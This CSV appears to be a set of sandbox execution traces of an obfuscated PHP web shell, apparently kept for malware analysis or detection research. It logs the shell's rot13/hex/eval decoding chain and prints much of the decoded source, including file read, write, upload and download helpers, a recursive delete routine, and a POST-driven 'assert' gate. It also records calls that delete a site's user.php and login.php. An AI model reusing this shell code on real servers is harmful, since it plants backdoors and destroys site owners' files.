uuid,file_md5,index,source,target,argc,argv,return,dynamic
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,0,__main__,zend_compile_file,2,{"value": []},{"value": "413C413C413C3941413C3A3941413C3A3941413C3A413C2641413C00003C283E"},[]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,1,__main__,error_reporting,1,"{""value"": [[0, ""new_error_level"", 1]]}",{"value": "void"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,2,__main__,unlink,1,"{""value"": [[0, ""filename"", ""user.php""]]}",{"value": "void"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,3,__main__,unlink,1,"{""value"": [[0, ""filename"", ""../member/login.php""]]}",{"value": "void"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,4,__main__,ini_set,2,"{""value"": [[0, ""varname"", ""display_errors""], [1, ""newvalue"", ""Off""]]}",{"value": "void"},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,5,__main__,ini_set,2,"{""value"": [[0, ""varname"", ""max_execution_time""], [1, ""newvalue"", 20000]]}",{"value": "void"},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,6,__main__,ini_set,2,"{""value"": [[0, ""varname"", ""memory_limit""], [1, ""newvalue"", ""256M""]]}",{"value": "void"},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,7,__main__,header,1,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=utf-8""]]}",{"value": "void"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,8,__main__,define,2,"{""value"": [[0, ""constant_name"", ""Viv, bebegim.""], [1, ""value"", ""Denzel-\\xc4\\xe3\\xb5\\xc4\\xd3\\xa2\\xd0\\xdb""]]}",{"value": "void"},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,9,__main__,s,0,{"value": []},{"value": null},[]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,10,s,str_rot13,1,"{""value"": [[0, ""str"", ""66756r6374696s6r20737472646972282473747229207o2072657475726r207374725s7265706p61636528617272617928275p5p272p272s2s272p27253237272p""]]}",{"value": "66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,11,s,m,1,"{""value"": [[0, ""str"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}",{"value": null},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,12,m,pack,2,"{""value"": [[0, ""format"", ""H*""], [1, ""args"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}","{""value"": ""function strdir($str) { return str_replace(array('\\\\','//','%27','%22'),array('/','/','\\'','\""'),chop($str)); }\r\nfunction chkgpc($a""}","[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,13,m,eval,1,"{""value"": [[0, ""phpcode"", ""function strdir($str) { return str_replace(array('\\\\','//','%27','%22'),array('/','/','\\'','\""'),chop($str)); }\r\nfunction chkgpc($a""]]}",{"value": null},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,14,eval,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function strdir($str) { return str_replace(array('\\\\','//','%27','%22'),array('/','/','\\'','\""'),chop($str)); }\r\nfunction chkgpc($array) { foreach($array as $key => $var) { $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var); } return $array; }\r\n$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);\r\n$myfile = strpos($myfile,'eval()') ? array_shift(explode('(',$myfile)) : $myfile;\r\ndefine('THISDIR',strdir(dirname($myfile).'/'));\r\ndefine('ROOTDIR',strdir(strtr($myfile,array(strdir($_SERVER['PHP_SELF']) => '')).'/'));\r\ndefine('EXISTS_PHPINFO',getinfo() ? true : false);\r\nif(get_magic_quotes_gpc()) { $_POST = chkgpc($_POST); }\r\nif(function_exists('mysql_close')) { $issql = 'MySql'; }\r\nif(function_exists('mssql_close')) $issql .= ' - MsSql';\r\nif(function_exists('oci_close')) $issql .= ' - Oracle';\r\nif(function_exists('sybase_close')) $issql .= ' - SyBase';\r\nif(function_exists('pg_close')) $issql .= ' - PostgreSql';\r\n$win = substr(PHP_OS,0,3) == 'WIN' ? true : false;\r\n$msg = VERSION;\r\n\r\nfunction filew($filename,$filedata,$filemode) {\r\n\tif((!is_writable($filename)) && file_exists($filename)) { chmod($filename,0666); }\r\n\t$handle = fopen($filename,$filemode);\r\n\t$key = fputs($handle,$filedata);\r\n\tfclose($handle);\r\n\treturn $key;\r\n}\r\n\r\nfunction filer($filename) {\r\n\t$handle = fopen($filename,'r');\r\n\t$filedata = fread($handle,filesize($filename));\r\n\tfclose($handle);\r\n\treturn $filedata;\r\n}\r\n\r\nfunction fileu($filenamea,$filenameb) {\r\n\t$key = move_uploaded_file($filenamea,$filenameb) ? true : false;\r\n\tif(!$key) { $key = copy($filenamea,$filenameb) ? true : false; }\r\n\treturn $key;\r\n}\r\n\r\nfunction filed($filename) {\r\n\tif(!file_exists($filename)) return false;\r\n\tob_end_clean();\r\n\t$name = basename($filename);\r\n\t$array = explode('.',$name);\r\n\theader('Content-type: application/x-'.array_pop($array));\r\n\theader('Content-Disposition: attachment; filename='.$name);\r\n\theader('Content-Length: '.filesize($filename));\r\n\t@readfile($filename);\r\n\texit;\r\n}\r\n\r\nfunction showdir($dir) {\r\n\t$dir = strdir($dir.'/');\r\n\tif(($handle = @opendir($dir)) == NULL) return false;\r\n\t$array = array();\r\n\twhile(false !== ($name = readdir($handle))) {\r\n\t\tif($name == '.' || $name == '..') continue;\r\n\t\t$path = $dir.$name;\r\n\t\t$name = strtr($name,array('\\'' => '%27','\""' => '%22'));\r\n\t\tif(is_dir($path)) { $array['dir'][$path] = $name; }\r\n\t\telse { $array['file'][$path] = $name; }\r\n\t}\r\n\tclosedir($handle);\r\n\treturn $array;\r\n}\r\n\r\nfunction deltree($dir) {\r\n\t$handle = @opendir($dir);\r\n\twhile(false !== ($name = @readdir($handle))) {\r\n\t\tif($name == '.' || $name == '..') continue;\r\n\t\t$path = $dir.$name;\r\n\t\t@chmod($path,0777);\r\n\t\tif(is_dir($path)) { deltree($path.'/'); }\r\n\t\telse { @unlink($path); }\r\n\t}\r\n\t@closedir($handle);\r\n\treturn @rmdir($dir);\r\n}\r\n\r\nfunction size($bytes) {\r\n\tif($bytes < 1024) return $bytes.' B';\r\n\t$array = array('B','K','M','G','T');\r\n\t$floor = floor(log($bytes) / log(1024));\r\n\treturn sprintf('%.2f '.$array[$floor],($bytes/pow(1024,floor($floor))));\r\n}\r\n\r\nfunction find($array,$string) {\r\n\tforeach($array as $key) { if(stristr($string,$key)) return true; }\r\n\treturn false;\r\n}\r\n\r\nfunction scanfile($dir,$key,$inc,$fit,$tye,$chr,$ran,$now) {\r\n\tif(($handle = @opendir($dir)) == NULL) return false;\r\n\twhile(false !== ($name = readdir($handle))) {\r\n\t\tif($name == '.' || $name == '..') continue;\r\n\t\t$path = $dir.$name;\r\n\t\tif(is_dir($path)) { if($fit && in_array($name,$fit)) continue; if($ran == 0 && is_readable($path)) scanfile($path.'/',$key,$inc,$fit,$tye,$chr,$ran,$now); }\r\n\t\telse {\r\n\t\t\tif($inc && (!find($inc,$name))) continue;\r\n\t\t\t$code = $tye ? filer($path) : $name;\r\n\t\t\t$find = $chr ? stristr($code,$key) : (strpos(size(filesize($path)),'M') ? false : (strpos($code,$key) > -1));\r\n\t\t\tif($find) {\r\n\t\t\t\t$file = strtr($path,array($now => '','\\'' => '%27','\""' => '%22'));\r\n\t\t\t\techo '<a href=\""javascript:go(\\'editor\\',\\''.$file.'\\');\"">\\xe7\\xbc\\x96\\xe8\\xbe\\x91</a> '.$path.'<br>';\r\n\t\t\t\tflush(); ob_flush();\r\n\t\t\t}\r\n\t\t\tunset($code);\r\n\t\t}\r\n\t}\r\n\tclosedir($handle);\r\n\treturn true;\r\n}\r\n\r\nfunction antivirus($dir,$exs,$matches,$now) {\r\n\tif(($handle = @opendir($dir)) ""]]}",{"value": "000050512B5051423C9D2A413C9D2642413C2B41423C6A3C9D2A9D2641423C08413C6A3C41425051423C47413C08413C6A3C413B3D2B162A16413C3C2B50423C53262A413C2B262A413C2B1E2A413C2B1E2A413C2B1E2A413C2B1E2A4141413C112B162A1626632600000000000000000000000000000059732B5051112B505108505108413C2626423C0D2B262A2A2A286308413C6A3C0808282850512B50519D2A5051423C9D083C08083C08083C08083C080828722B0808282A28474848484848484826505142423C2B50519D2A9D2659732B5051423C08413C9D2A639D26284D4E892626112B162A1608080808423C08080808282A3128283C2808082828285051302B632B3C413C3C263C47264142433C51512651512B5151085151089D2A51519D262A505147413C2B413C9D2A9D48413C2B413C9D2A9D482B9D2A9D483C48483C4850514850514850514850514850514850514850512B50519D2A9D48413C6A3C48413C6A3C48413C48413C48413C48413C0848413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A16482B9D2A9D4826080828284D4E89262608080808282A3128322A302B2B162A162647482659732B50519D2A9D2659732B505126112B63162A162642423C262A51080828283C28423C080828284748264D4E8926260808112B162A1608080808282A31282828413C0808630808282828282828282828282828282828282828282828282851423C080828322A302B59732B5051423C9D2A9D2659732B50519D2A9D2659732B5051423C9D2A9D2659732B5051423C9D2A9D26080828283C2828423C080828423C080828423C080828423C08082850512B162A1608082850512B162A1608082850512B162A1608082850512B162A1608082850512B162A160808282828122B3C3C28112B9D2A41423C9D26112B9D2A41423C9D2608413C6A424242505142505142505142423C262B162A160808282A322A302B59732B5051423C9D2A9D2659732B50519D2A479D26080828283C2828423C08082828474848264D4E89262608080808080851112B162A1608080808282A3128285051423C132B474747484748263C3C2808413C6A4242423C262B162A160808282A322A302B59732B5051423C263C4241413C112E42413C11342B39500808493A2A3950493A3C263C2A2626413C28080828283C28423C0808282828282828286308082828282828423C080828322A302B59730D2E59730D342E59730D342B505126505126505126505126505126505126505126302B413C2B42413C2B41423C26512651262A26393B37383738373837383738413D3A262B0808263B08413D3B423D262B1E3B423D262B93892A2A1E3B423D47263B423D2A080826393B423D3A2A080826322A302B413C2B393B4242423D3A262B0808263B42423D3B423D262B1E3B423D262B93892A2A1E393B423D3A2A080826393B423D3A2A080826322A302B413C2B393B42420808413D3A262B0808263B42423D263B423D2B1E3B4263413D262B93892A2A1E3B3D265147263B423D2A3B3D26514726080826393B423D3A2A080826322A302B413C2B3B42413C2B9D2A089D6A4242423D262B0808264241413C112B472626264142433C51512E5151342E5151342E5151342B3B5D5D42423D3B0841423D5151080851510808263B42423D262B3B4263413D262B41423C081E24462A2B5151423C264242413C2B162A161E47423C6A3C080848262A1E2A1E3B3D473B3D48262A1E2A720D2B3B42423D3B0841423D3B42423D262B1E3B4263413D262B93892A2A1E3B3D473B3D48262A3B423D2A0808263B3D473B3D48263B423D2A080826322A2A26262626262626080828283C28282847484848264D4E89260808112B162A1608080808282A310808280808280808280808282828282808080808282828282808082828282828286308082828423C08082828474848484848484848264D4E89260808112B162A1608080808282A3128282B283C423C3C263C41423C2E413C342B394141423C3A262A423C28282A322A302B59730D2E59730D342B50512650512650512B50519D2A9D26505126424242423C262A26262626080828283C2828080828080808082808082828474848484848264D4E8926260808112B162A1608080808282A312828322A302B2A302B505108505108413C26413C26423C0D2B262A423C262641423C2E342B26394141423C3A262A423C6A3C26423C6A3C6A413C08080808080826413C28080828283C28423C0808280808282B284748264D4E8926260808112B162A1608080808282A31282A423C08082828423C0808283C28322A302B59732B50519D2A50519D26413C0808413C0808262659732E5973342B505126472626132D24462A5151112B505151112B51519D2A5051519D265151260808413C2642423C2B0808162A08081693892A2A2A080828283C2808082826132D24462A080808080808510808282A280808283C28322A2A59732B505151112B262A5051112B5051519D2A50519D265051512608413C2642423C2B0808162A080816262A59732B5051302B50510D2B50510808262A2650514D4E8926395008413C6A50510808413C6A3C3A2B162A16172A312B080850510808162A080850510808162626322A302B50510D2B262A2650514D4E8926395008413C6A3C3A2B162A16172A312B0808162A08081626322A302B50510D2B5051"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,15,eval,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,16,eval,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,17,eval,strdir,1,"{""value"": [[0, ""str"", ""/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php""]]}",{"value": "/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,18,strdir,chop,1,"{""value"": [[0, ""str"", ""/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php""]]}",{"value": "/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,19,strdir,str_replace,3,"{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php""]]}",{"value": "/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php"},"[0, 0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,20,eval,strpos,2,"{""value"": [[0, ""haystack"", ""/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_12d6648c-a6f0-4aed-a921-0cf00b5e3409.php""], [1, ""needle"", ""eval()""]]}",{"value": false},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,21,eval,dirname,1,"{""value"": [[0, ""path"", ""/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_12d6648c-a6f0-4aed-a921-0cf00b5e3409.php""]]}",{"value": "/usr/share/nginx/html"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,22,eval,strdir,1,"{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}",{"value": "/usr/share/nginx/html/"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,23,strdir,chop,1,"{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}",{"value": "/usr/share/nginx/html/"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,24,strdir,str_replace,3,"{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/usr/share/nginx/html/""]]}",{"value": "/usr/share/nginx/html/"},"[0, 0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,25,eval,define,2,"{""value"": [[0, ""constant_name"", ""THISDIR""], [1, ""value"", ""/usr/share/nginx/html/""]]}",{"value": "void"},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,26,eval,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,27,eval,strdir,1,"{""value"": [[0, ""str"", ""/24830e9f840ba21eaa2e27721797e0a4_12d6648c-a6f0-4aed-a921-0cf00b5e3409.php""]]}",{"value": "/24830e9f840ba21eaa2e27721797e0a4_12d6648c-a6f0-4aed-a921-0cf00b5e3409.php"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,28,strdir,chop,1,"{""value"": [[0, ""str"", ""/24830e9f840ba21eaa2e27721797e0a4_12d6648c-a6f0-4aed-a921-0cf00b5e3409.php""]]}",{"value": "/24830e9f840ba21eaa2e27721797e0a4_12d6648c-a6f0-4aed-a921-0cf00b5e3409.php"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,29,strdir,str_replace,3,"{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php""]]}",{"value": "/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php"},"[0, 0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,30,eval,strtr,2,"{""value"": [[0, ""str"", ""/usr/share/nginx/html/24830e9f840ba21eaa2e27721797e0a4_9796fde1-d148-463d-b990-6f4fc027cb90.php""], [1, ""from"", []]]}",{"value": "/usr/share/nginx/html"},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,31,eval,strdir,1,"{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}",{"value": "/usr/share/nginx/html/"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,32,strdir,chop,1,"{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}",{"value": "/usr/share/nginx/html/"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,33,strdir,str_replace,3,"{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/usr/share/nginx/html/""]]}",{"value": "/usr/share/nginx/html/"},"[0, 0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,34,eval,define,2,"{""value"": [[0, ""constant_name"", ""ROOTDIR""], [1, ""value"", ""/usr/share/nginx/html/""]]}",{"value": "void"},"[0, 0]"
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,35,eval,getinfo,0,{"value": []},{"value": null},[]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,36,getinfo,zend_fetch_r_post,1,"{""value"": [[0, ""op1"", ""_POST""]]}",{"value": []},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,37,getinfo,function_exists,1,"{""value"": [[0, ""function_name"", ""phpinfo""]]}",{"value": true},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,38,getinfo,md5,1,"{""value"": [[0, ""str"", ""assert""]]}",{"value": "e44e4612f62d2fb8f8738bab118a9850"},[0]
4e1b95193cdbbf0b02cafd52d89b08e3,24830e9f840ba21eaa2e27721797e0a4,39,getinfo,zend_fetch_r_post,1,"{""value"": [[0, ""op1"", ""_POST""]]}",{"value": []},[0]
